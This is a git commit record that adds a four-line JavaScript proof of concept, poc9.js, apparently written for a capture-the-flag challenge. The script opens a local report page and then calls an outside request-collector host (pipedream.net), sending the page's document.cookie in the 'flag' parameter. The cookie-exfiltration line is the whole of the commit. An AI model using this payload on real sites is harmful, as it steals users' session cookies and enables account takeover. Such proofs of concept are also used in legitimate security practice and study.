703e691a866f3f076f4f370d0ab7b0985a57efa5
Pocas <pocas.cyber@gmail.com>
2022-03-15 18:08:21 +0900

    Create poc9.js

---
+++ poc9.js
@@ -0,0 +1,4 @@
+const win = window.open('http://localhost:8000/report?url=http://a.c');
+setTimeout(() => {
+    fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?flag=${document.cookie}`);
+}, 1000);
